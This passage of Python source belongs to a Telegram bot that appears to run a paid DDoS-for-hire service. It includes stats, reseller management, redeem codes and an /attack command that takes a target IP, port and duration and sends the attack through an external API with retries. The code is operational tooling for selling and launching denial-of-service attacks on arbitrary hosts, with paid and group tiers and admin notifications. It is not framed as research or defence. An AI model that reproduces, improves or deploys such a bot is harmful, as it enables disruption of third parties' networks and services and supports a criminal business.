    total_attacks = sum(u.get('total_attacks', 0) for u in users)
    resellers_count = len(resellers)
    
    message = (
        f"*📊 Bot Stats*\n\n"
        f"*👑 Paid Users:* {paid_count}\n"
        f"*👥 Groups:* {groups_count}\n"
        f"*🎯 Total Attacks:* {total_attacks}\n"
        f"*🔄 Resellers:* {resellers_count}\n"
        f"*⚡ Paid Max:* {PAID_USER_MAX_DURATION}s\n"
        f"*👥 Group Max:* {GROUP_USER_MAX_DURATION}s\n\n"
        f"*⚡ Concurrent Limits:*\n"
        f"• Admin: {ADMIN_MAX_CONCURRENT}\n"
        f"• Paid: {PAID_USER_MAX_CONCURRENT}\n"
        f"• Group: {GROUP_USER_MAX_CONCURRENT}"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def blocked_ports_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    can_use, reason = await can_use_bot(user_id, chat_id)
    if not can_use:
        return
    
    is_member, not_joined = await check_channel_membership(context, user_id)
    if not is_member and user_id != ADMIN_USER_ID:
        await send_channel_required_message(context, chat_id, user_id)
        return
    
    message = f"*🚫 Blocked Ports:*\n`{get_blocked_ports_list()}`\n*Total: {len(BLOCKED_PORTS)}*"
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# ================= RESELLER MANAGEMENT COMMANDS =================

async def reselling_command(update: Update, context: CallbackContext):
    """Manage resellers: /reselling <add/remove> <user_id>"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ Only bot owner can manage resellers!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /reselling <add/remove> <user_id>*\n*Example: /reselling add 6793877235*", parse_mode='Markdown')
        return

    action = context.args[0].lower()
    try:
        target_user_id = int(context.args[1])
    except ValueError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ Invalid user ID!*", parse_mode='Markdown')
        return

    if action == "add":
        if target_user_id in resellers:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ User {target_user_id} is already a reseller!*", parse_mode='Markdown')
            return
        
        resellers.add(target_user_id)
        resellers_collection.insert_one({"user_id": target_user_id})
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} is now a reseller!*\n*They can now add users and generate codes.*", parse_mode='Markdown')
        
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text="*✅ You have been promoted to Reseller!*\n\n*You can now use:*\n*🔸 /add <user_id> <time>*\n*🔸 /remove <user_id>*\n*🔸 /users* - List users\n*🔸 /gen <time> [code]* - Generate codes\n*🔸 /delete_code <code>*\n*🔸 /list_codes*",
                parse_mode='Markdown'
            )
        except:
            pass
            
    elif action == "remove":
        if target_user_id not in resellers:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ User {target_user_id} is not a reseller!*", parse_mode='Markdown')
            return
        
        resellers.discard(target_user_id)
        resellers_collection.delete_one({"user_id": target_user_id})
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed from resellers!*", parse_mode='Markdown')
        
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text="*❌ You have been removed from Reseller role!*\n*You can no longer add users or generate codes.*",
                parse_mode='Markdown'
            )
        except:
            pass
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Invalid action! Use 'add' or 'remove'*", parse_mode='Markdown')

async def resellers_command(update: Update, context: CallbackContext):
    """List all resellers"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ Only bot owner can view resellers!*", parse_mode='Markdown')
        return

    if not resellers:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*📭 No resellers found*", parse_mode='Markdown')
        return

    message = "*🔄 Reseller List:*\n\n"
    for rid in resellers:
        message += f"• `{rid}`\n"
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

# ================= ATTACK COMMAND =================

async def attack_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    # Check if user can use bot
    can_use, reason = await can_use_bot(user_id, chat_id)
    if not can_use:
        if reason == "group_not_approved":
            await context.bot.send_message(chat_id=chat_id, text="❌ This group is not approved!\nContact @RAJOWNERX1 for approval.")
        elif reason == "private_not_allowed":
            await context.bot.send_message(chat_id=chat_id, text="❌ Private chat not allowed!\nUse /redeem to activate paid access.")
        return
    
    # Check channel membership
    is_member, not_joined = await check_channel_membership(context, user_id)
    if not is_member and user_id != ADMIN_USER_ID:
        await send_channel_required_message(context, chat_id, user_id)
        return

    # Check active attack limit
    if await is_user_has_active_attack(user_id):
        remaining = get_remaining_time(user_id)
        max_concurrent = get_user_max_concurrent(user_id)
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*⚠️ Attack limit reached!*\n\n*You have {await get_user_active_attack_count(user_id)}/{max_concurrent} attacks running*\n*⏰ Wait {remaining}s for one to finish*", 
            parse_mode='Markdown'
        )
        return

    args = context.args
    if len(args) != 3:
        if is_paid_user(user_id):
            max_dur = PAID_USER_MAX_DURATION
        else:
            max_dur = await get_group_max_duration(chat_id)
        max_concurrent = get_user_max_concurrent(user_id)
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*⚠️ Usage: /attack <ip> <port> <duration>*\n\n*⚡ Max Duration: {max_dur}s*\n*⚡ Concurrent: {max_concurrent} attack(s)*", 
            parse_mode='Markdown'
        )
        return

    ip, port_str, duration_str = args
    
    # Validate IP
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if not ip_pattern.match(ip):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address format!*\n*Example: 192.168.1.1*", parse_mode='Markdown')
        return
    
    # Validate port
    try:
        port = int(port_str)
        if port < MIN_PORT or port > MAX_PORT:
            await context.bot.send_message(chat_id=chat_id, text=f"*❌ Port must be between {MIN_PORT} and {MAX_PORT}!*", parse_mode='Markdown')
            return
        if is_port_blocked(port):
            blocked = get_blocked_ports_list()
            await context.bot.send_message(chat_id=chat_id, text=f"*❌ Port {port} is blocked!*\n*Blocked ports: {blocked}*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid port! Please enter a number.*", parse_mode='Markdown')
        return
    
    # Validate duration
    try:
        duration = int(duration_str)
        if is_paid_user(user_id):
            max_duration = PAID_USER_MAX_DURATION
        else:
            max_duration = await get_group_max_duration(chat_id)
        
        if duration < MIN_DURATION:
            await context.bot.send_message(chat_id=chat_id, text=f"*❌ Duration must be at least {MIN_DURATION} second!*", parse_mode='Markdown')
            return
        if duration > max_duration:
            await context.bot.send_message(chat_id=chat_id, text=f"*❌ Duration cannot exceed {max_duration} seconds!*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid duration! Please enter a number.*", parse_mode='Markdown')
        return

    # Send attack launched message
    status_msg = await context.bot.send_message(
        chat_id=chat_id, 
        text=f"*⚔️ Attack Launched! ⚔️*\n\n*🎯 Target: {ip}:{port}*\n*🕒 Duration: {duration} seconds*\n*🔥 Let the battlefield ignite! 💥*", 
        parse_mode='Markdown'
    )

    # Notify admin
    await context.bot.send_message(
        chat_id=ADMIN_USER_ID, 
        text=f"*⚔️ Attack by User {user_id}*\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s", 
        parse_mode='Markdown'
    )

    # Launch attack via API with retry (15 retries, 90s timeout)
    response = launch_attack_with_retry(ip, port, duration, max_retries=15)
    
    if response.get("success"):
        attack_data = response.get("attack", {})
        limits = response.get("limits", {})
        
        # Register active attack
        end_time = get_current_time().timestamp() + duration
        await add_user_attack(user_id, end_time, chat_id, status_msg.message_id)
        
        log_attack(user_id, ip, port, duration, "success", str(response))
        
        # Start progress tracking
        asyncio.create_task(attack_progress_message(context, chat_id, user_id, ip, port, duration, status_msg.message_id))
        
    else:
        error_msg = response.get("error", "Unknown error")
        
        # Better error messages
        if "502" in error_msg:
            error_msg = "HTTP 502 - Bad Gateway (retrying...)"
        elif "500" in error_msg:
            error_msg = "HTTP 500 - Internal Server Error (retrying...)"
        elif "connection" in error_msg.lower():
            error_msg = "Connection failed - Retrying..."
        elif "timeout" in error_msg.lower():
            error_msg = "Request timeout - Retrying..."
        elif "401" in error_msg or "403" in error_msg:
            error_msg = "Authentication failed - Invalid API key"
        elif "404" in error_msg:
            error_msg = "API endpoint not found - Wrong API URL"
        
        # If still failed after all retries
        await status_msg.edit_text(
            f"*❌ ATTACK FAILED! ❌*\n\n"
            f"*🎯 Target:* `{ip}:{port}`\n"
            f"*⏱️ Duration:* {duration}s\n"
            f"*❌ Error:* `{error_msg}`\n\n"
            f"*💡 Troubleshooting:*\n"
            f"• Check if target IP is valid\n"
            f"• Try a different port\n"
            f"• Try again after some time\n"
            f"• Contact admin if issue persists",
            parse_mode='Markdown'
        )
        log_attack(user_id, ip, port, duration, "failed", str(response))

# ================= MAIN FUNCTION =================
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("myattacks", myattacks))
    application.add_handler(CommandHandler("blockedports", blocked_ports_command))
    application.add_handler(CommandHandler("redeem", redeem_code))
    
    # Admin/Reseller commands
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    
    # Admin only commands
    application.add_handler(CommandHandler("approve", approve_group))
    application.add_handler(CommandHandler("revoke", revoke_group))
    application.add_handler(CommandHandler("groups", list_groups))
    application.add_handler(CommandHandler("setgroupduration", set_group_duration))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("running", running_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("reselling", reselling_command))
    application.add_handler(CommandHandler("resellers", resellers_command))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="check_join"))
    
    print("\n" + "="*50)
    print("🔥 BOT STARTED SUCCESSFULLY 🔥")
    print("="*50)
    print(f"👑 Admin ID: {ADMIN_USER_ID}")
    print(f"⚡ Paid Users: {PAID_USER_MAX_DURATION}s max, {PAID_USER_MAX_CONCURRENT} concurrent")
    print(f"👥 Group Users: {GROUP_USER_MAX_DURATION}s max, {GROUP_USER_MAX_CONCURRENT} concurrent")
    print(f"👑 Admin: {ADMIN_MAX_CONCURRENT} concurrent attacks")
    print(f"🔄 Resellers: {len(resellers)}")
    print(f"📢 Required Channels: {len(REQUIRED_CHANNELS)}")
    if REQUIRED_CHANNELS and REQUIRED_CHANNELS[0]:
        for ch in REQUIRED_CHANNELS:
            print(f"   - {ch}")
    print(f"🚫 Blocked Ports: {len(BLOCKED_PORTS)}")
    print("="*50)
    print("✅ Bot is running!")
    print("⚡ Auto-Retry: 15 attempts, 90s timeout, exponential backoff")
    print("⚡ Admin: 3 attacks at once | Paid: 2 | Group: 1")
    print("🔄 Resellers can add users and generate codes")
    print("📅 Time formats: 1d (days), 12h (hours), 30m (minutes)")
    print("="*50 + "\n")
    
    application.run_polling()

if __name__ == '__main__':
    main()